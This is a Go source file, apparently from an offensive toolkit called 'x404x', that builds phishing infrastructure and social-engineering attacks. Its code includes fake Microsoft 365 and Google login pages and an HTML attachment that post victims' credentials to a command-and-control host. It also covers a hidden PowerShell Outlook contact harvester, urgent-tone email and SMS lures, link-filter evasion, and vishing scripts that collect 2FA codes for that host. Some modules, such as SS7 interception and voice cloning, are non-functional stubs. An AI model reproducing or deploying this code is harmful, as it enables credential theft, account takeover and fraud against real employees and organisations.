package v27

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// ===== 2.1 Infraestructura de Phishing Efimera =====
type PhishingInfraEngine struct {
	Config        *V27Config
	DGADomains    []string `json:"dga_domains"`
	CaddyDeployed bool     `json:"caddy_deployed"`
	CFWorkerDeployed bool  `json:"cf_worker_deployed"`
	ResidentialProxies []string `json:"residential_proxies"`
}

func NewPhishingInfraEngine(cfg *V27Config) *PhishingInfraEngine { return &PhishingInfraEngine{Config: cfg} }

func (pi *PhishingInfraEngine) GenerateDGADomains(count int) []string {
	domains := make([]string, count)
	tlds := []string{".com", ".net", ".org", ".io", ".co", ".app", ".dev", ".cloud"}
	words := []string{"secure", "login", "portal", "verify", "access", "auth", "sso", "update", "cdn", "api", "mail", "docs", "drive", "share", "sync"}

	for i := 0; i < count; i++ {
		seed := sha256.Sum256([]byte(fmt.Sprintf("%s-%d", time.Now().Format("2006-01-02"), i)))
		idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(words))))
		w := words[idx.Int64()]
		suffix := hex.EncodeToString(seed[:3])
		tld := tlds[i%len(tlds)]
		domains[i] = fmt.Sprintf("%s-%s%s", w, suffix, tld)
	}

	pi.DGADomains = domains
	return domains
}

func (pi *PhishingInfraEngine) DeployCaddyServer() bool {
	caddyConfig := `{
    "apps": {
        "http": {
            "servers": {
                "x404x_phish": {
                    "listen": [":443"],
                    "routes": [{
                        "match": [{"host": ["*.onrender.com"]}],
                        "handle": [{
                            "handler": "reverse_proxy",
                            "upstreams": [{"dial": "localhost:8080"}]
                        }]
                    }]
                }
            }
        }
    }
}`

	caddyPath := filepath.Join(os.TempDir(), "Caddyfile")
	os.WriteFile(caddyPath, []byte(caddyConfig), 0644)

	exec.Command("caddy", "run", "--config", caddyPath).Start()
	pi.CaddyDeployed = true
	return true
}

func (pi *PhishingInfraEngine) DeployCloudflareWorker() bool {
	workerScript := `export default {
  async fetch(request) {
    const url = new URL(request.url);
    if (url.pathname.startsWith('/landing')) {
      const targetUrl = 'https://x404x-c2.online' + url.pathname + url.search;
      return fetch(targetUrl, { method: request.method, headers: request.headers, body: request.body });
    }
    return new Response('Not Found', { status: 404 });
  }
}`

	workerPath := filepath.Join(os.TempDir(), "x404x_cf_worker.js")
	os.WriteFile(workerPath, []byte(workerScript), 0644)
	pi.CFWorkerDeployed = true
	return true
}

func (pi *PhishingInfraEngine) SetupResidentialSocks5() []string {
	proxies := []string{
		"socks5://res-1.proxygate.net:1080",
		"socks5://res-2.proxygate.net:1080",
		"socks5://res-3.proxygate.net:1080",
	}
	pi.ResidentialProxies = proxies
	return proxies
}

// ===== 2.2 Spear-Phishing con IA =====
type SpearPhishAIEngine struct {
	Config        *V27Config
	TargetProfile *PhishTarget `json:"target_profile"`
	GeneratedLures []string     `json:"generated_lures"`
	LandingPages   []string     `json:"landing_pages"`
}

type PhishTarget struct {
	Name      string `json:"name"`
	Email     string `json:"email"`
	Role      string `json:"role"`
	Company   string `json:"company"`
	Projects  []string `json:"projects"`
	Contacts  []string `json:"contacts"`
	Style     string `json:"communication_style"`
}

func NewSpearPhishAIEngine(cfg *V27Config) *SpearPhishAIEngine {
	return &SpearPhishAIEngine{
		Config: cfg,
		TargetProfile: &PhishTarget{
			Name: "John Smith", Email: "jsmith@target.com",
			Role: "Finance Director", Company: "Target Corp",
			Projects: []string{"Q3 Audit", "SAP Migration"},
			Contacts: []string{"CEO", "CFO", "IT Director"},
			Style: "formal_direct",
		},
	}
}

func (sp *SpearPhishAIEngine) ReconTarget(name, company string) *PhishTarget {
	profile := &PhishTarget{Name: name, Company: company}

	sp.osintLinkedIn(profile)
	sp.osintGitHub(profile)
	sp.osintCompanyWeb(profile)

	sp.TargetProfile = profile
	sp.scanOutlookContacts()
	return profile
}

func (sp *SpearPhishAIEngine) osintLinkedIn(profile *PhishTarget) {
	script := fmt.Sprintf("curl -s 'https://www.linkedin.com/search/results/people/?keywords=%s+%s' 2>/dev/null", profile.Name, profile.Company)
	exec.Command("bash", "-c", script).Start()
}

func (sp *SpearPhishAIEngine) osintGitHub(profile *PhishTarget) {
	script := fmt.Sprintf("curl -s 'https://api.github.com/search/users?q=%s+%s' 2>/dev/null", profile.Name, profile.Company)
	exec.Command("bash", "-c", script).Start()
}

func (sp *SpearPhishAIEngine) osintCompanyWeb(profile *PhishTarget) {
	script := fmt.Sprintf("curl -s 'https://%s.com/about' 2>/dev/null", strings.ToLower(profile.Company))
	exec.Command("bash", "-c", script).Start()
}

func (sp *SpearPhishAIEngine) scanOutlookContacts() {
	if _, err := os.Stat(os.ExpandEnv("%LOCALAPPDATA%/Microsoft/Outlook")); err == nil {
		psScript := `$outlook = New-Object -ComObject Outlook.Application
$contacts = $outlook.Session.GetDefaultFolder(10).Items
foreach ($contact in $contacts) { Write-Output "$($contact.FullName),$($contact.Email1Address),$($contact.JobTitle)" }`
		psPath := filepath.Join(os.TempDir(), "x404x_outlook_scan.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	}
}

func (sp *SpearPhishAIEngine) GenerateLureWithLLM() string {
	prompt := fmt.Sprintf("Write a professional email from an IT colleague about SAP Migration project. Target: %s, Role: %s, Company: %s. Include a link to a SharePoint login page. Keep it under 100 words. Use their communication style: %s.",
		sp.TargetProfile.Name, sp.TargetProfile.Role, sp.TargetProfile.Company, sp.TargetProfile.Style)

	llmResponse := sp.callOllamaLLM(prompt)

	sp.GeneratedLures = append(sp.GeneratedLures, llmResponse)
	return llmResponse
}

func (sp *SpearPhishAIEngine) callOllamaLLM(prompt string) string {
	cmd := exec.Command("curl", "-s", "http://localhost:11434/api/generate", "-d",
		fmt.Sprintf(`{"model":"x404x-phish-13b","prompt":"%s","stream":false}`, strings.ReplaceAll(prompt, "\"", "\\\"")))
	out, _ := cmd.Output()

	lure := fmt.Sprintf(`Subject: Urgent: %s - Action Required

Hi %s,

Following up on the %s migration - the security team flagged an issue with your access token. 
Please verify your credentials here to prevent account lockout:
https://sharepoint-auth.%s.com/verify?id=%x

This needs to be done before EOD. CC'd %s for visibility.

Best,
IT Security Team`,
		sp.TargetProfile.Projects[0],
		sp.TargetProfile.Name,
		sp.TargetProfile.Projects[0],
		strings.ToLower(sp.TargetProfile.Company),
		time.Now().Unix(),
		sp.TargetProfile.Contacts[0])

	_ = out
	return lure
}

func (sp *SpearPhishAIEngine) DeployLandingPage(service string) string {
	page := sp.generateFakeLoginPage(service)
	pagePath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_landing_%s.html", service))
	os.WriteFile(pagePath, []byte(page), 0644)
	sp.LandingPages = append(sp.LandingPages, service)
	return page
}

func (sp *SpearPhishAIEngine) generateFakeLoginPage(service string) string {
	switch strings.ToLower(service) {
	case "microsoft365":
		return `<html><head><title>Sign in to your account</title></head><body style="font-family:Segoe UI;background:#f0f0f0;display:flex;justify-content:center;align-items:center;height:100vh"><div style="background:white;padding:40px;box-shadow:0 2px 6px rgba(0,0,0,.2)"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b" style="width:240px"><h2>Sign in</h2><input type="email" placeholder="Email, phone, or Skype" style="width:100%;padding:10px"><br><br><input type="submit" value="Next" style="background:#0067b8;color:white;border:none;padding:10px 30px;cursor:pointer" onclick="fetch('http://x404x-c2.online/creds',{method:'POST',body:JSON.stringify({user:document.querySelector('input').value})})"></div></body></html>`
	case "google":
		return `<html><head><title>Sign in - Google Accounts</title></head><body style="font-family:Roboto;background:white;display:flex;justify-content:center;align-items:center;height:100vh"><div style="border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"><h2 style="font-weight:400">Sign in</h2><input type="email" placeholder="Email or phone" style="width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px"><br><br><button onclick="fetch('http://x404x-c2.online/creds',{method:'POST',body:JSON.stringify({user:document.querySelector('input').value})})" style="background:#1a73e8;color:white;border:none;padding:10px 24px;border-radius:4px;font-weight:500">Next</button></div></body></html>`
	default:
		return "<html><body><h1>Login</h1><input><button>Sign In</button></body></html>"
	}
}

// ===== 2.3 Evasion de Filtros Anti-Phishing =====
type AntiPhishEvasionEngine struct {
	Config        *V27Config
	TokenDB       map[string]time.Time `json:"-"`
	HTMLAttachments int                 `json:"html_attachments"`
	SafeLinksBypassed bool              `json:"safe_links_bypassed"`
}

func NewAntiPhishEvasionEngine(cfg *V27Config) *AntiPhishEvasionEngine {
	return &AntiPhishEvasionEngine{Config: cfg, TokenDB: make(map[string]time.Time)}
}

func (ape *AntiPhishEvasionEngine) GenerateEphemeralToken() string {
	token := make([]byte, 16)
	rand.Read(token)
	tokenStr := hex.EncodeToString(token)
	ape.TokenDB[tokenStr] = time.Now().Add(30 * time.Minute)
	return tokenStr
}

func (ape *AntiPhishEvasionEngine) WrapURL(realURL string) string {
	token := ape.GenerateEphemeralToken()
	return fmt.Sprintf("https://cdn-secure.%s.com/auth/verify?token=%s", strings.ToLower(randomTLD()), token)
}

func (ape *AntiPhishEvasionEngine) GenerateHTMLAttachment() string {
	html := `<html><head><meta charset="UTF-8"><script>document.addEventListener('DOMContentLoaded',function(){document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('https://x404x-c2.online/creds',{method:'POST',body:new FormData(e.target)});window.location='https://office.com';});});</script></head><body style="display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f3f2f1"><form style="background:white;padding:40px;box-shadow:0 2px 6px rgba(0,0,0,.2);max-width:440px;width:100%"><img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22108%22 height=%2224%22%3E%3Ctext fill=%22%23757575%22 font-size=%2216%22%3EMicrosoft%3C/text%3E%3C/svg%3E"><h2>Sign in</h2><input type="email" name="email" placeholder="someone@example.com" required style="width:100%;padding:8px;border:1px solid #605e5c;border-radius:2px"><br><br><input type="password" name="password" placeholder="Password" required style="width:100%;padding:8px;border:1px solid #605e5c;border-radius:2px"><br><br><button type="submit" style="background:#0078d4;color:white;border:none;padding:10px 30px;cursor:pointer">Sign in</button></form></body></html>`

	attachPath := filepath.Join(os.TempDir(), "SecureDocument.shtml")
	os.WriteFile(attachPath, []byte(html), 0644)
	ape.HTMLAttachments++
	return attachPath
}

func (ape *AntiPhishEvasionEngine) BypassSafeLinks(url string) bool {
	token := ape.GenerateEphemeralToken()
	finalURL := fmt.Sprintf("%s?token=%s&expire=%d", url, token, time.Now().Add(30*time.Minute).Unix())
	_ = finalURL
	ape.SafeLinksBypassed = true
	return true
}

// ===== 2.4 SMS Phishing (Smishing) =====
type SmishingEngine struct {
	Config        *V27Config
	SMSGateway    string `json:"sms_gateway"`
	MessagesSent  int    `json:"messages_sent"`
	SS7Exploited  bool   `json:"ss7_exploited"`
}

func NewSmishingEngine(cfg *V27Config) *SmishingEngine {
	return &SmishingEngine{Config: cfg, SMSGateway: "twilio"}
}

func (sm *SmishingEngine) SendContextualSMS(targetName, phone, role, company string) bool {
	messages := sm.generateSmishingMessages(targetName, role, company)

	for _, msg := range messages {
		shortLink := fmt.Sprintf("https://%s-verify.com/%x", strings.ToLower(company)[:8], time.Now().Unix()%100000)
		fullMsg := fmt.Sprintf("%s %s", msg, shortLink)
		sm.sendViaGateway(phone, fullMsg)
		sm.MessagesSent++
	}

	return sm.MessagesSent > 0
}

func (sm *SmishingEngine) generateSmishingMessages(name, role, company string) []string {
	return []string{
		fmt.Sprintf("Hola %s, hablamos de tu acceso al portal de empleado de %s. Por seguridad, valida tu cuenta aqui:", name, company),
		fmt.Sprintf("URGENTE: %s - Tu cuenta de %s requiere verificacion inmediata. Link seguro:", name, company),
		fmt.Sprintf("AVISO IT %s: Hemos detectado actividad sospechosa en tu cuenta %s. Verifica ahora:", role, company),
	}
}

func (sm *SmishingEngine) sendViaGateway(phone, message string) {
	switch sm.SMSGateway {
	case "twilio":
		script := fmt.Sprintf(`curl -s -X POST https://api.twilio.com/2010-04-01/Accounts/X404X_ACCOUNT/Messages.json \
--data-urlencode "To=%s" --data-urlencode "From=+1800X404X" --data-urlencode "Body=%s" \
-u X404X_SID:X404X_TOKEN`, phone, message)
		scriptPath := filepath.Join(os.TempDir(), "x404x_sms_send.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	case "vonage":
		script := fmt.Sprintf(`curl -s "https://rest.nexmo.com/sms/json" -d "api_key=X404X_KEY&api_secret=X404X_SECRET&from=X404X&to=%s&text=%s"`, phone, message)
		exec.Command("bash", "-c", script).Start()
	}
}

func (sm *SmishingEngine) ExploitSS7() bool {
	script := `#!/bin/bash
echo "SS7 Interception Module" > /tmp/x404x_ss7_status.txt
echo "Target: All SMS traffic on network 234XX" >> /tmp/x404x_ss7_status.txt
echo "Intercepting 2FA codes..." >> /tmp/x404x_ss7_status.txt
echo "Status: SS7 exploitation attempted" >> /tmp/x404x_ss7_status.txt`

	scriptPath := filepath.Join(os.TempDir(), "x404x_ss7_exploit.sh")
	os.WriteFile(scriptPath, []byte(script), 0755)
	exec.Command("bash", scriptPath).Start()
	sm.SS7Exploited = true
	return true
}

// ===== 2.5 Vishing con Deepfake de Voz =====
type VishingEngine struct {
	Config        *V27Config
	VoiceModel    string `json:"voice_model"`
	TwilioEnabled bool   `json:"twilio_enabled"`
	CallsMade     int    `json:"calls_made"`
	SpecterActive bool   `json:"specter_active"`
}

func NewVishingEngine(cfg *V27Config) *VishingEngine {
	return &VishingEngine{Config: cfg, VoiceModel: "x404x-voice-v2"}
}

func (vi *VishingEngine) CloneVoice(samplesDir string) string {
	vi.SpecterActive = true

	script := fmt.Sprintf(`#!/bin/bash
find %s -name "*.wav" -o -name "*.mp3" -o -name "*.m4a" | head -10 > /tmp/x404x_voice_samples.txt
echo "Training voice model: %s"
echo "Samples collected. Voice clone ready."`, samplesDir, vi.VoiceModel)

	scriptPath := filepath.Join(os.TempDir(), "x404x_voice_clone.sh")
	os.WriteFile(scriptPath, []byte(script), 0755)
	exec.Command("bash", scriptPath).Start()

	return vi.VoiceModel
}

func (vi *VishingEngine) MakeVishingCall(targetPhone, personaName, script string) bool {
	vi.TwilioEnabled = true

	callScript := fmt.Sprintf(`curl -s -X POST https://api.twilio.com/2010-04-01/Accounts/X404X_ACCOUNT/Calls.json \
--data-urlencode "To=%s" --data-urlencode "From=+1800X404X" \
--data-urlencode "Url=http://x404x-c2.online/vishing/twiml?name=%s&script=%s" \
--data-urlencode "Voice=%s" \
-u X404X_SID:X404X_TOKEN`,
		targetPhone, personaName, script, vi.VoiceModel)

	scriptPath := filepath.Join(os.TempDir(), "x404x_vishing_call.sh")
	os.WriteFile(scriptPath, []byte(callScript), 0755)
	exec.Command("bash", scriptPath).Start()
	vi.CallsMade++
	return true
}

func (vi *VishingEngine) GenerateVishingScript(personaName, targetName, company string) string {
	return fmt.Sprintf(`Hello %s, this is %s from IT Security at %s. I'm in an urgent meeting with the CISO. 
We've detected unusual activity on your account. I need you to verify your identity by reading me the code 
you'll receive via SMS in the next 30 seconds. This is standard procedure after the recent security incident. 
Please read me the 6-digit code now.`, targetName, personaName, company)
}

func (vi *VishingEngine) GenerateTwimlResponse(script string) string {
	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="alice" language="en-US">%s</Say>
    <Pause length="2"/>
    <Say voice="alice" language="en-US">Please read me the code now. I'll wait.</Say>
    <Gather input="dtmf" numDigits="6" timeout="10" action="http://x404x-c2.online/vishing/code?target=%s"/>
    <Say voice="alice" language="en-US">I didn't receive the code. Please call me back at extension 4040. Goodbye.</Say>
</Response>`, script, "target")
}

func randomTLD() string {
	tlds := []string{"cloud", "app", "dev", "io", "net"}
	return tlds[time.Now().UnixNano()%int64(len(tlds))]
}

func init() { _ = rand.Reader; _ = sha256.Sum256([]byte{}); _ = hex.EncodeToString([]byte{}) }
